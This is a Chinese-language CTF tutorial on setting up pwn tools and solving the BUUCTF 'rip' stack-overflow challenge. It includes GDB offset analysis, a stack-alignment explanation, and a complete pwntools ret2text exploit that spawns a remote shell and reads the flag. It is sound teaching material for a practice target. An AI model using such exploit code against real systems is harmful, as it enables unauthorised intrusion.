---
title: "Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell"
date: 2026-11-02 10:00:00
updated: 2026-11-02 10:00:00
categories:
  - CTF
  - Pwn
  - 栈溢出
tags:
  - Pwn
  - 栈溢出
  - ret2text
  - pwntools
  - pwndbg
  - GDB
  - BUUCTF
description: 从零把 pwn 环境搭好（gdb、pwndbg、pwntools、ROPgadget、one_gadget），再用 BUUCTF rip 走完第一道栈溢出：找后门、算偏移、处理栈对齐、写 exp 拿 shell。
difficulty: 入门
topic: Pwn 入门
series: Pwn 入门
series_order: 1
permalink: 2026/11/02/pwn-ctf-rip/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（第一次接触 pwn 也能跟着做）
- **考点**：`gets` 栈溢出、ret2text、返回地址覆盖、栈对齐
- **工具**：IDA、gdb + pwndbg、pwntools
- **关键操作**：把返回地址改成 `fun + 1`，也就是 `0x401187`
- **偏移**：`15`（缓冲区）+ `8`（保存的 rbp）= `23` 字节
- **flag**：`CTF2{47738d33-5a5c-43d3-8237-894d33ef459e}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：C 语言函数调用、栈的基本概念、会用 Linux 命令行
- **环境**：Linux（Kali / Ubuntu 都行）、IDA（逆向章节有讲）
- **靶场**：文中的地址是当时平台的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`装环境` → `file / checksec 看保护` → `IDA 找 main` → `找后门函数` → `算偏移` → `处理栈对齐` → `写 exp` → `getshell 读 flag`
{% endnote %}

## 先把环境搭起来

根据这道题，我会带你正式走进 pwn。

在开始之前，先把工具准备好。需要的东西不多：

1. **IDA**：主要用来静态分析，看伪代码和汇编（逆向章节已经讲过）
2. **gdb + pwndbg**：动态调试，看栈、看寄存器
3. **pwntools**：写 exp 的 Python 库，后面每一道题都会用到
4. **Linux 环境**：Kali 或者 Ubuntu 都可以，不建议在 Windows 上硬做

### 安装 gdb

先更新软件源，然后把编译工具和调试工具一起装上：

```bash
sudo apt update
sudo apt install -y build-essential gdb python3 python3-pip git nasm gcc-multilib libc6-dbg
```

这几个包的分工如下：

| 包名 | 作用 |
| --- | --- |
| `gdb` | 原生调试器，pwn 动态调试的核心 |
| `build-essential` | gcc、make 等编译工具 |
| `gcc-multilib` | 支持编译/运行 32 位程序，遇到 32 位题不会抓瞎 |
| `libc6-dbg` | libc 的调试符号，gdb 里能看清函数名和源码行 |
| `nasm` | 汇编器，偶尔要手写 shellcode 时会用到 |

### 安装 pwntools

```bash
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

{% note warning %}
**如果你的 Python 是 3.14，直接装可能会报错。**

原因是 pwntools 依赖的 `unicorn` 在 3.14 上还没有预编译的 wheel，pip 会退回到源码编译。这时候需要先把编译工具链补齐：

```bash
sudo apt update
sudo apt install -y cmake ninja-build build-essential libgit2-dev pkg-config python3-dev
```

装完再执行一次：

```bash
python3 -m pip install --upgrade pwntools
```

如果还是失败，最省事的办法是换 Python 3.11 / 3.12 的虚拟环境。**入门阶段不要把时间耗在环境上**，能跑起来最重要。
{% endnote %}

装完测试一下：

```bash
python3 -c "from pwn import *; print('pwntools version:', version)"
```

能打印出版本号就说明 `from pwn import *` 没问题。

### 安装 GDB 增强插件 pwndbg

原生 gdb 的界面比较素，pwndbg 会在调试时自动显示寄存器、栈、反汇编，做 pwn 基本离不开它：

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

装完重新打开 gdb，看到 `pwndbg>` 提示符就成功了。

### 安装 ROP 与 One-Gadget 辅助工具

这两个工具这道题用不上，但后面做 ROP、ret2libc 会经常用，顺手一起装好。

ROPgadget：

```bash
python3 -m pip install ROPgadget
```

one_gadget：

```bash
# 如果没有 ruby，先安装
sudo apt install -y ruby
# 安装 one_gadget
gem install one_gadget
```

### 验证安装

```bash
checksec --version
ROPgadget --version
one_gadget --version
```

`checksec` 是 pwntools 自带的，能正常输出版本就说明 pwntools 装好了。

{% note info %}
如果 `one_gadget` 提示找不到命令，多半是 gem 的可执行目录不在 `PATH` 里。先用下面这条命令看路径：

```bash
gem environment
```

把输出里的 `EXECUTABLE DIRECTORY` 加到 `~/.bashrc`：

```bash
export PATH="$PATH:$(gem environment | grep 'EXECUTABLE DIRECTORY' | awk '{print $NF}')"
source ~/.bashrc
```
{% endnote %}

## 认识目标文件

题目附件下载下来是一个叫 `pwn1` 的文件。先别急着运行，用 `file` 看它是什么：

```bash
file pwn1
```

输出大概是：

```text
pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

关键信息：

| 字段 | 含义 |
| --- | --- |
| `ELF 64-bit` | 64 位 Linux 程序，地址是 8 字节 |
| `x86-64` | 架构是 amd64 |
| `dynamically linked` | 动态链接，运行时依赖 libc |
| `not stripped` | 没去符号，IDA 里能直接看到函数名 |

再看保护：

```bash
checksec --file=pwn1
```

输出大致如下：

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`checksec` 相当于给程序做一次“安全体检”，每一行都是一种保护机制。新手第一次看基本都会懵，下面逐项拆开讲。

| 字段 | 本例输出 | 一句话解释 |
| --- | --- | --- |
| `Arch` | `amd64-64-little` | 64 位、小端序。地址占 8 字节，exp 里用 `p64` |
| `RELRO` | `Partial RELRO` | GOT 表只锁了一部分，仍然可写 |
| `Stack` | `No canary found` | 栈上没有金丝雀，可以直接覆盖返回地址 |
| `NX` | `NX enabled` | 栈不可执行，不能把 shellcode 放栈上跑 |
| `PIE` | `No PIE (0x400000)` | 程序基址固定，函数地址可以写死 |

### Arch：程序是几位的

`amd64-64-little` 拆成三部分看：

- `amd64`：x86-64 架构，也就是常说的 64 位；
- `64`：地址宽度 64 位，一个地址占 8 字节；
- `little`：小端序，低字节放在低地址。

这直接决定 exp 里用 `p64` 还是 `p32`。用错了，地址在内存里就是反的，程序一跳就崩。

### RELRO：GOT 表能不能改

RELRO（Relocation Read-Only）是用来保护 **GOT 表**的。GOT 表里存着 `puts`、`system` 这些外部函数的真实地址，程序第一次调用时由动态链接器填进去。

| 取值 | 含义 |
| --- | --- |
| `No RELRO` | GOT 完全可写，最不安全 |
| `Partial RELRO` | 部分区域设为只读，GOT 仍可写（最常见） |
| `Full RELRO` | 启动后整个 GOT 只读，不能再改 |

这题不涉及改 GOT，所以 `Partial RELRO` 先不用管。等以后做 **GOT 劫持** 的题，看到 `Partial RELRO` 才知道有下手的机会；`Full RELRO` 就直接断了这条路。

### Stack：有没有金丝雀

“金丝雀”（canary）是编译器在栈上放的一个随机值，位置正好在**缓冲区**和**保存的 rbp / 返回地址**之间。函数返回前会检查它有没有被改动：

```text
缓冲区  ->  金丝雀  ->  保存的 rbp  ->  返回地址
```

一旦你溢出时把金丝雀覆盖了，程序会调用 `__stack_chk_fail` 直接退出，返回地址根本没机会用。

| 取值 | 含义 |
| --- | --- |
| `No canary found` | 没放金丝雀，可以一路覆盖到返回地址 ✅ |
| `Canary found` | 有金丝雀，得先泄露它，再原样写回去 |

这题是 `No canary found`，所以溢出时不用先想办法泄露金丝雀，可以放心往返回地址方向覆盖。

### NX：栈能不能执行

NX（No-eXecute）把栈、堆这些区域标记成“不可执行”。开了 NX 之后，就算你把自己的 shellcode 写到栈上，再跳过去执行，也会直接段错误。

| 取值 | 含义 |
| --- | --- |
| `NX enabled` | 栈不可执行，不能直接跑栈上的 shellcode |
| `NX disabled` | 栈可执行，可以把 shellcode 放栈上跳过去 |

这题的 `NX enabled` 不影响我们，因为我们的做法是 **ret2text**：跳到程序自己代码段里现成的 `system("/bin/sh")`，根本不需要执行栈上的东西。

{% note success %}
**保护机制只决定路线，不决定能不能做。** 有 NX 就走 ret2text / ROP，有 canary 就先泄露 canary，有 PIE 就先泄露基址。看到一堆 `enabled` 不要慌，先看哪条保护真正挡住了你的思路。
{% endnote %}

### PIE：地址会不会变

PIE（Position Independent Executable）让程序每次运行时加载到**随机基址**，函数地址每次都不同。

| 取值 | 含义 |
| --- | --- |
| `No PIE (0x400000)` | 基址固定为 `0x400000`，`0x401186` 可以直接写死 |
| `PIE enabled` | 每次基址随机，必须先泄露一个地址再算偏移 |

这题是 `No PIE`，所以 IDA / GDB 里看到的 `0x401186`，在远程靶机上也是同一个地址，exp 里可以放心写常量。

## IDA 里看 main

用 IDA 打开 `pwn1`，在左侧函数窗口找到 `main`，按 `F5` 反编译，得到类似下面的伪代码：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rbp-Fh]

  puts("please input");
  gets(s);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

![main 的伪代码](image.png)

*图 1：`main` 里定义了一个 15 字节的数组 `s`，然后调用 `gets` 往里面读*

这里就是整道题的入口，重点只有一行：

```c
gets(s);
```

`s` 只有 15 字节，但 `gets` **不检查长度**，你输入多少它就写多少，一直到遇到换行或者 EOF 为止。多出来的部分会顺着栈继续往下写，把保存的 `rbp`、返回地址一起覆盖掉。

{% note warning %}
**`gets` 是 C 语言里最危险的函数之一**，C11 之后已经被标准移除。但 CTF 里它反而是常客，因为“不限长度”正是栈溢出的前提。看到 `gets`，基本就可以先怀疑栈溢出了。

另外，图里 IDA 把 `gets` 的参数显示成了两个，这是它对老函数原型的识别问题，实际只有一个参数，不用纠结。
{% endnote %}

## 找后门函数

左侧函数栏里有一个很扎眼的 `fun`：

![函数列表里的 fun](image-1.png)

*图 2：函数列表里除了 `main`，还有一个单独的 `fun`*

双击进去，按 `F5`：

```c
int fun()
{
  return system("/bin/sh");
}
```

![fun 的伪代码](image-2.png)

*图 3：`fun` 直接调用 `system("/bin/sh")`，这就是后门*

确定这就是我们要跳的地方。它的入口地址是 `0x401186`，但这个地址是怎么看出来的、为什么 exp 里还要 `+1`，下面用 GDB 把汇编调出来，一步一步看。

这道题不需要泄露 libc，也不需要构造 ROP 链，程序里已经有一个现成的 `system("/bin/sh")`，我们只要把返回地址改成它。这种利用方式叫 **ret2text**：返回到程序自身的代码段（`.text`）里。

## GDB 入门：把汇编调出来

IDA 的 `F5` 很直观，但做 pwn 不能只会看伪代码。**真正的偏移、地址、栈布局，最后都要在 GDB 里确认一遍。** 新手第一次用 GDB 容易不知道敲什么，这一节把常用操作走一遍。

GDB 是 Linux 下的调试器，pwndbg 是它的增强插件。装好 pwndbg 后，打开 GDB 会看到 `pwndbg>` 提示符，而不是默认的 `(gdb)`。

### 打开程序

先 `cd` 到 `pwn1` 所在目录，然后：

```bash
gdb ./pwn1
```

![启动 gdb](image-3.png)

*图 4：用 `gdb ./pwn1` 加载程序；装好 pwndbg 后，提示符会变成 `pwndbg>`*

如果提示 `Permission denied`，先给程序加执行权限：

```bash
chmod +x pwn1
```

### 反汇编 main

进去以后，第一条要会的命令是 `disassemble`，简写 `disas`：

```text
pwndbg> disassemble main
```

![gdb 反汇编 main](image-4.png)

*图 5：`disassemble main` 的输出，和 IDA 里看到的是同一段代码*

输出的每一行长这样：

```text
0x0000000000401142 <+0>:  push rbp
```

拆开看：

| 部分 | 含义 |
| --- | --- |
| `0x0000000000401142` | 这条指令在内存里的地址 |
| `<+0>` | 相对函数入口的偏移，`<+32>` 就是入口往后 32 字节 |
| `push rbp` | 真正要执行的汇编指令 |
| `# 0x402004` | GDB 自动加的注释，通常是字符串或地址提示 |

把 `main` 的完整汇编抄在下面，后面算偏移要用：

```asm
0x401142 <+0>:  push rbp
0x401143 <+1>:  mov  rbp, rsp
0x401146 <+4>:  sub  rsp, 0x10
0x40114a <+8>:  lea  rdi, [rip+0xeb3]   # "please input"
0x401151 <+15>: call 0x401030 <puts@plt>
0x401156 <+20>: lea  rax, [rbp-0xf]
0x40115a <+24>: mov  rdi, rax
0x40115d <+27>: mov  eax, 0
0x401162 <+32>: call 0x401050 <gets@plt>
0x401167 <+37>: lea  rax, [rbp-0xf]
0x40116b <+41>: mov  rdi, rax
0x40116e <+44>: call 0x401030 <puts@plt>
0x401173 <+49>: lea  rdi, [rip+0xe97]   # "ok,bye!!!"
0x40117a <+56>: call 0x401030 <puts@plt>
0x40117f <+61>: mov  eax, 0
0x401184 <+66>: leave
0x401185 <+67>: ret
```

### 反汇编 fun

同样的方法看后门函数：

```text
pwndbg> disassemble fun
```

![gdb 反汇编 fun](image-5.png)

*图 6：`disassemble fun` 的输出*

```asm
0x401186 <+0>:  push rbp
0x401187 <+1>:  mov  rbp, rsp
0x40118a <+4>:  lea  rdi, [rip+0xe8a]   # 0x40201b, "/bin/sh"
0x401191 <+11>: call 0x401040 <system@plt>
0x401196 <+16>: nop
0x401197 <+19>: pop  rbp
0x401198 <+20>: ret
```

函数入口是 `0x401186`，但我们 exp 里要写的是 **`0x401187`**，也就是 `fun + 1`。原因先卖个关子，后面讲栈对齐的时候会说清楚。

### 先认识几个寄存器和指令

看汇编绕不开寄存器。入门阶段先记住这四个：

| 寄存器 | 作用 |
| --- | --- |
| `rip` | 下一条要执行的指令地址。**控制 rip 就是控制程序往哪走** |
| `rsp` | 栈顶指针，指向当前栈顶 |
| `rbp` | 栈帧基址，函数开头建立，函数结束时恢复 |
| `rdi` / `rsi` / `rdx` | 64 位下函数的前三个参数 |

再认识几条最常见的指令：

| 指令 | 作用 |
| --- | --- |
| `push rbp` | `rsp` 减 8，把 `rbp` 的值写到栈顶 |
| `pop rbp` | 从栈顶读 8 字节到 `rbp`，`rsp` 加 8 |
| `call addr` | 先把下一条指令的地址（返回地址）压栈，再跳到 `addr` |
| `ret` | 从栈顶弹出返回地址，跳到那里 |
| `leave` | 等价于 `mov rsp, rbp; pop rbp`，拆除当前栈帧 |

函数开头一般是：

```asm
push rbp        ; 保存调用者的 rbp
mov rbp, rsp    ; 建立自己的栈帧
sub rsp, 0x10   ; 给局部变量腾空间
```

函数结尾是：

```asm
leave           ; 恢复 rsp 和 rbp
ret             ; 弹出返回地址，跳回去
```

`gets` 溢出覆盖的，就是 `ret` 要弹出的那个**返回地址**。把它改成 `fun + 1`，`ret` 就会跳到后门。

### 下断点，亲眼看栈

光看汇编还不够，最好自己跑一遍。GDB 的基本操作是：**下断点 → 运行 → 看内存 → 继续**。

在 `gets` 返回之后下断点：

```text
pwndbg> b *0x401167
Breakpoint 1 at 0x401167
pwndbg> run
```

这里能直接写 `0x401167`，是因为这道题 **No PIE**，地址固定。以后遇到 PIE 的程序，地址每次加载都会变，断点要写成 `b *main+37` 这种“函数名 + 偏移”的形式。

程序会停在 `please input`，让你输入。这里输入一串有规律的字符，方便观察——先输入 **23 个 A + 8 个 B**：

```text
AAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```

停住以后，看 `rbp` 附近的栈：

```text
pwndbg> x/4gx $rbp-0x8
```

`x` 是 examine（查看内存），`4` 是看 4 个，`g` 是每个 8 字节（giant word），`x` 是按十六进制显示。输出大概是这样：

```text
0x7fffffffe0d8: 0x4141414141414141  0x4141414141414141
0x7fffffffe0e8: 0x4242424242424242  0x00007fffffffe1c8
```

{% note info %}
你机器上的地址肯定和这里不一样，**重点看冒号后面的值，不用管前面的地址**。`0x41` 是字符 `A`，`0x42` 是字符 `B`。
{% endnote %}

对照栈图看：

| 位置 | 值 | 说明 |
| --- | --- | --- |
| `rbp - 0x8` | `0x4141414141414141` | 缓冲区 `s` 的后 8 个字节，被 A 填满 |
| `rbp` | `0x4141414141414141` | 保存的 rbp，被第 16～23 个 A 覆盖 |
| `rbp + 0x8` | `0x4242424242424242` | 返回地址，已经被 8 个 B 覆盖 |

看到最后一行，偏移就实锤了：**前 23 个字节刚好填到返回地址前面，第 24 个字节开始就是返回地址。**

再执行 `continue`（简写 `c`）：

```text
pwndbg> c
```

程序会尝试跳到 `0x4242424242424242`，这个地址根本不存在，于是直接段错误。**崩掉不是坏事，它证明返回地址确实被我们控制了。**

### GDB 常用命令速查

| 命令 | 简写 | 作用 |
| --- | --- | --- |
| `disassemble main` | `disas main` | 反汇编函数 |
| `break *0x401167` | `b *0x401167` | 在指定地址下断点 |
| `run` | `r` | 从头运行程序 |
| `continue` | `c` | 继续运行到下一个断点 |
| `nexti` | `ni` | 单步执行一条指令（不进入 call） |
| `stepi` | `si` | 单步执行一条指令（进入 call） |
| `info registers` | `i r` | 查看所有寄存器 |
| `x/4gx $rbp-0x8` | — | 从指定地址查看 4 个 8 字节十六进制值 |
| `stack 20` | — | pwndbg 的栈视图，看栈顶 20 项 |
| `telescope $rsp 20` | — | pwndbg 的智能栈视图，会自动解析地址指向的符号 |
| `quit` | `q` | 退出 GDB |

{% note warning %}
**GDB 里调试的是本地程序，不要拿它去连远程靶机。** 远程连接交给 pwntools 的 `remote()`；本地想调 exp，可以把 `remote(...)` 换成 `process('./pwn1')`，或者用 `gdb.debug('./pwn1', 'b *0x401167')` 让 pwntools 帮你开 GDB。
{% endnote %}

## 算偏移：23 字节从哪来

回到 `main` 的汇编（图 5 那张），看这两行就够了：

```asm
0x401156 <+20>: lea rax, [rbp-0xf]
0x401162 <+32>: call gets@plt
```

缓冲区 `s` 的起始地址是 `rbp - 0xf`，也就是 `rbp - 15`。栈的布局是这样的：

```text
        高地址
        +----------------------+
        |  main 的返回地址 (8)  |  <- rbp + 8
        +----------------------+
        |  保存的 rbp (8)       |  <- rbp
        +----------------------+
        |  s[15]                |  <- rbp - 0xf
        +----------------------+
        低地址
```

要覆盖到返回地址，需要走过：

1. `s` 本身的 15 字节；
2. 保存的 `rbp` 8 字节。

所以偏移是：

```text
15 + 8 = 23
```

也就是说，前 23 个字节是垃圾数据，第 24 字节开始才是返回地址。64 位程序地址占 8 字节，所以 payload 一共 `23 + 8 = 31` 字节。

{% note info %}
**为什么不是 15 字节就够？** 因为 `s` 和返回地址之间还夹着一个“保存的 rbp”。`leave` 指令会先 `mov rsp, rbp`，再 `pop rbp`，最后 `ret` 弹出返回地址。你不把保存的 rbp 填掉，就碰不到返回地址。
{% endnote %}

## 为什么跳 `fun + 1`

前面说 exp 里要写 `0x401187`，不是函数入口 `0x401186`。这不是随手加的，是为了**栈对齐**。

64 位 Linux 遵循 SysV ABI，有一条硬性要求：**执行 `call` 指令之前，`rsp` 必须是 16 字节对齐的**。`call` 会压入 8 字节返回地址，所以进入被调函数时，`rsp % 16 == 8`。

正常用 `call` 进入 `fun` 时，栈是这样的：

```text
call fun 前：rsp % 16 == 0
call 压入返回地址：rsp % 16 == 8
fun 的 push rbp：rsp % 16 == 0
call system 前：rsp % 16 == 0   ✅ 对齐
```

但我们是**用 `ret` 跳过去的**。`main` 的 `ret` 已经把返回地址弹掉了，此时 `rsp % 16 == 0`，比正常 `call` 进入函数时少了压栈的那 8 字节。如果直接跳到 `0x401186`：

```text
ret 进入 fun：rsp % 16 == 0
fun 的 push rbp：rsp % 16 == 8
call system 前：rsp % 16 == 8   ❌ 错位
```

`system` 内部有些指令（比如 `movaps`）要求 16 字节对齐，栈错位时可能直接崩掉，shell 还没起来程序就没了。

所以我们要跳过 `fun` 开头的 `push rbp`，从 `0x401187` 的 `mov rbp, rsp` 开始执行：

```text
ret 进入 fun+1：rsp % 16 == 0
跳过 push rbp：rsp % 16 == 0
call system 前：rsp % 16 == 0   ✅ 对齐
```

`mov rbp, rsp` 只是给 `rbp` 赋个值，后面 `system` 用不到 `rbp`，跳过 `push` 完全没影响。这就是 `0x401186 + 1` 的由来。

{% note success %}
**记住这个套路**：64 位 ret2text 里，如果目标函数是 `system("/bin/sh")` 这种可能碰到 `movaps` 的 libc 函数，返回地址经常要写成 `函数地址 + 1`，跳过开头的 `push rbp`。不是所有题都必须，但遇到“跳过去就崩”的时候，先想到栈对齐。
{% endnote %}

## 写 exp

用 pwntools 把上面的思路翻译成脚本：

```python
from pwn import *

context.log_level = 'info'

HOST = '94ba9a89383493ea70673cf8.tcp-ctf2.dasctf.com'
PORT = 9999

BACKDOOR_ADDR = 0x401186 + 1   # fun + 1，跳过 push rbp 保证栈对齐
PADDING = 23                   # 15 字节缓冲区 + 8 字节保存的 rbp

io = remote(HOST, PORT, ssl=True, sni=HOST)

payload = b'A' * PADDING
payload += p64(BACKDOOR_ADDR)

log.info(f"Sending payload ({len(payload)} bytes) -> backdoor @ {hex(BACKDOOR_ADDR)}")
io.sendline(payload)

io.interactive()
```

逐行拆开看：

| 代码 | 作用 |
| --- | --- |
| `from pwn import *` | 导入 pwntools，`remote`、`p64`、`log` 都在里面 |
| `context.log_level = 'info'` | 设置日志级别，运行时终端会打印彩色的提示信息 |
| `HOST` / `PORT` | 靶机地址和端口，按平台给你的填 |
| `BACKDOOR_ADDR = 0x401186 + 1` | 后门地址，`+1` 是为了跳过 `push rbp` |
| `PADDING = 23` | 覆盖到返回地址所需的偏移 |
| `remote(...)` | 建立连接；平台强制 TLS 时加 `ssl=True, sni=HOST` |
| `b'A' * PADDING` | 造 23 个垃圾字节，把缓冲区和保存的 rbp 填满 |
| `p64(BACKDOOR_ADDR)` | 把地址打包成 8 字节小端序 |
| `sendline(payload)` | 发送 payload，并补一个换行 |
| `interactive()` | 把终端交给靶机，可以手动敲命令 |

{% note warning %}
**`remote` 的参数要看平台**：

- 像本文这种 `*.tcp-ctf2.dasctf.com` 的地址，走的是 TLS，所以要写 `remote(HOST, PORT, ssl=True, sni=HOST)`；
- BUUCTF 那种 `nc` 直连的地址，直接 `remote(HOST, PORT)` 就行，加 `ssl=True` 反而连不上。

连不上时先检查这一点，不要一上来就怀疑 exp。
{% endnote %}

### p64 是在干什么

`p64(0x401187)` 会把整数变成 8 字节的小端序 bytes：

```python
>>> from pwn import *
>>> p64(0x401187)
b'\x87\x11@\x00\x00\x00\x00\x00'
```

x86-64 是小端序，低字节放低地址。内存里看到的是 `87 11 40 00 00 00 00 00`，CPU 读 8 字节时正好还原成 `0x401187`。

打包函数按位数区分，别用错：

| 长度 | 打包（数字 → bytes） | 解包（bytes → 数字） | 适用场景 |
| --- | --- | --- | --- |
| 1 字节 | `p8(x)` | `u8(x)` | 极少单独使用，一般用于单字节覆盖 |
| 2 字节 | `p16(x)` | `u16(x)` | 极少，特殊截断或硬件题 |
| 4 字节 | `p32(x)` | `u32(x)` | 32 位程序，地址形如 `0x0804a000` |
| 8 字节 | `p64(x)` | `u64(x)` | 64 位程序，地址形如 `0x0000000000401186` |

{% note info %}
**怎么看程序是 32 位还是 64 位？** 看 `file` 的输出。`ELF 64-bit` 用 `p64`，`ELF 32-bit` 用 `p32`。用错了地址会对不上，程序直接崩，而且报错往往看不出原因。
{% endnote %}

## 跑起来

保存成 `exploit.py`，运行：

```bash
python3 exploit.py
```

![运行 exp](image-6.png)

*图 7：连上靶机，发送 31 字节 payload，成功进入交互模式*

看到 `$` 提示符就说明 shell 已经拿到了。先 `ls` 看看目录：

```bash
ls
```

![ls 的结果](image-7.png)

*图 8：根目录下有一个 `flag` 文件*

直接读：

```bash
cat /flag
```

得到：

```text
CTF2{47738d33-5a5c-43d3-8237-894d33ef459e}
```

{% note info %}
最后出现 `Got EOF while reading in interactive` 是正常现象。你执行完 `cat /flag` 后 shell 退出，连接断开，pwntools 就会打印这一行。flag 已经拿到了，不用管它。
{% endnote %}

## 新手常见问题

{% note info **Q1：缓冲区明明是 15 字节，为什么偏移是 23？** %}
15 是 `s` 本身的大小，`s` 上面还有 8 字节“保存的 rbp”，再往上才是返回地址。`15 + 8 = 23`。画一下栈图就不会记错了。
{% endnote %}

{% note info **Q2：为什么地址要写成 `0x401186 + 1`，直接写 `0x401186` 不行吗？** %}
直接写入口会执行 `push rbp`，把 `rsp` 再往下压 8 字节，导致 `call system` 时栈没有 16 字节对齐，可能崩在 `system` 内部的 `movaps`。`+1` 跳过 `push rbp`，正好把对齐补回来。详见“为什么跳 fun + 1”一节。
{% endnote %}

{% note info **Q3：覆盖保存的 rbp 不会出问题吗？** %}
会覆盖，但这题不影响。我们跳进 `fun + 1` 后，`mov rbp, rsp` 会立刻给 `rbp` 重新赋值，`system("/bin/sh")` 执行时也用不到原来的 `rbp`。等 shell 退出、`fun` 继续往下执行 `pop rbp; ret` 时栈才会乱，但那时候 flag 早就拿到了。所以这题可以随便填。
{% endnote %}

{% note info **Q4：`sendline` 会不会把地址后面的字节弄坏？** %}
不会。`sendline` 只是在 payload 末尾补一个 `\n`，`gets` 读到换行就停止，正好把前面的 31 字节完整写进栈里。地址里的 `\x00` 也不会截断 `gets`，它是按字节读到换行的。
{% endnote %}

{% note info **Q5：本地能打通，远程打不通？** %}
先确认三件事：地址是不是远程程序的、端口对不对、连接方式对不对。远程如果换了 libc 或开了 PIE，写死的地址就会失效。这题是 No PIE，地址固定，所以优先查网络和 `ssl` 参数。
{% endnote %}

{% note info **Q6：`checksec` 提示 command not found？** %}
`checksec` 随 pwntools 一起安装，通常在 `~/.local/bin`。把这个目录加进 `PATH`，或者直接用 `python3 -m pwnlib.checksec ./pwn1`。
{% endnote %}

{% note info **Q7：为什么要装 pwndbg，原生 gdb 不够吗？** %}
够用，但 pwndbg 会自动显示寄存器、栈、反汇编和内存布局，看栈溢出时能一眼找到返回地址的位置。入门阶段少折腾，直接用 pwndbg。
{% endnote %}

{% note info **Q8：gdb 里怎么确认偏移对不对？** %}
在 `gets` 之后下断点，输入一串有规律的字符（比如 `AAAABBBBCCCC...`），然后看 `rsp` 指向的返回地址被哪几个字符覆盖。pwndbg 里用 `stack 30` 或 `telescope $rsp 20` 看栈。
{% endnote %}

{% note info **Q9：脚本里的靶机地址打不开了？** %}
在线靶场是临时分配的，过期失效很正常。换成你自己的靶场地址；如果是本地复现，把 `remote` 换成 `process('./pwn1')` 即可。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件类型 | `file pwn1` |
| 2 | 看保护 | `checksec --file=pwn1` |
| 3 | 找入口 | IDA 打开，定位 `main`，`F5` |
| 4 | 找危险函数 | 看到 `gets(s)`，确认栈溢出 |
| 5 | 找后门 | 函数列表里找 `fun`，确认 `system("/bin/sh")` |
| 6 | 算偏移 | 缓冲区大小 + 8（保存的 rbp） |
| 7 | 处理对齐 | 64 位下目标地址 `+1`，跳过 `push rbp` |
| 8 | 写 exp | `payload = b'A' * offset + p64(backdoor)` |
| 9 | 打远程 | `remote(HOST, PORT)`，按平台决定是否加 `ssl` |
| 10 | 读 flag | `ls` → `cat /flag` |

## 小结

这道题虽然简单，但把 pwn 入门最核心的几步都走了一遍：

- **看保护**：`checksec` 决定你能不能覆盖返回地址、地址能不能写死；
- **找漏洞**：`gets` 不限制长度，是典型的栈溢出；
- **找目标**：程序里现成的 `system("/bin/sh")`，不需要自己构造 ROP；
- **算偏移**：缓冲区大小 + 保存的 rbp；
- **处理细节**：64 位栈对齐，该 `+1` 的时候要 `+1`；
- **写 exp**：pwntools 负责连接、打包、发送、交互。

下一道题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 32 位 ret2text | 地址 4 字节，用 `p32`；参数通过栈传递 |
| 有 canary | 先泄露 canary，再覆盖返回地址 |
| 有 PIE | 先泄露程序基址，再算真实地址 |
| 没有后门 | ret2libc：泄露 libc 地址，找 `system` 和 `/bin/sh` |
| NX 关闭 | 往栈上写 shellcode 再跳过去 |

{% note success %}
**一条经验**：pwn 题先别急着写 exp。先把 `file`、`checksec`、IDA 三件事做完，搞清楚“漏洞在哪、能控制什么、能跳去哪”，偏移和对齐都是后面自然算出来的。工具只是手，思路才是关键。
{% endnote %}
